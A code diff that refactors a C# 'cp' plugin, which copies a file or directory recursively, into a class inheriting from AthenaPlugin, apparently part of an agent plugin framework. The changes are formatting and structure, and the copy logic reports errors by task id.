@@ -2,16 +2,15 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-namespace Plugin
+namespace Plugins
 {
-    public static class cp
+    public class Plugin : AthenaPlugin
     {
-
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             try
             {
-                if(args.ContainsKey("source") && args.ContainsKey("destination"))
+                if (args.ContainsKey("source") && args.ContainsKey("destination"))
                 {
                     FileAttributes attr = File.GetAttributes((string)args["source"]);
 
@@ -19,7 +18,7 @@ namespace Plugin
                     if (attr.HasFlag(FileAttributes.Directory))
                     {
                         // Copy Directory to new location recursively
-                        if (!CopyDirectory(((string)args["source"]).Replace("\"",""), ((string)args["destination"]).Replace("\"",""), true))
+                        if (!CopyDirectory(((string)args["source"]).Replace("\"", ""), ((string)args["destination"]).Replace("\"", ""), true))
                         {
                             PluginHandler.Write($"Failed to copy {((string)args["source"]).Replace("\"", "")} to {((string)args["destination"]).Replace("\"", "")}", (string)args["task-id"], true, "error");
                         }
@@ -42,7 +41,7 @@ namespace Plugin
                 PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
             }
         }
-        static bool CopyDirectory(string sourceDir, string destinationDir, bool recursive)
+        private bool CopyDirectory(string sourceDir, string destinationDir, bool recursive)
         {
             // Get information about the source directory
             var dir = new DirectoryInfo(sourceDir);
